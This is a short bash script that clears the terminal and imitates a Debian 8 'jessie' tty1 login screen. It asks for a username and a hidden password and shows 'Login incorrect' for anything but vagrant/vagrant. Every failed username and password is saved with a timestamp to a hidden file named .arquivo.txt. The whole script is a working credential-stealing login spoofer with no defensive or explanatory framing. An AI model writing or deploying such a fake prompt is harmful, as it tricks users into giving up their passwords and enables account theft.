#!/bin/bash
incorreto(){	sleep 3 ; echo ; echo "Login incorrect" ; }
	clear
	echo
	echo "Debian GNU/Linux 8 jessie tty1"
	echo
	count=0
	while : ; do
		read -p "jessie Login: " LOGIN
		read -s -p "Password: " PASSW
		echo
		 [[ $LOGIN == "vagrant" ]] && [[ $PASSW == "vagrant" ]] && \
 break 2 || incorreto
	echo "$(date)>>$LOGIN" >> .arquivo.txt
	echo "$(date)>>$PASSW" >> .arquivo.txt
count=$(($count+1))
	[[ $count == "2" ]] && break
	done 
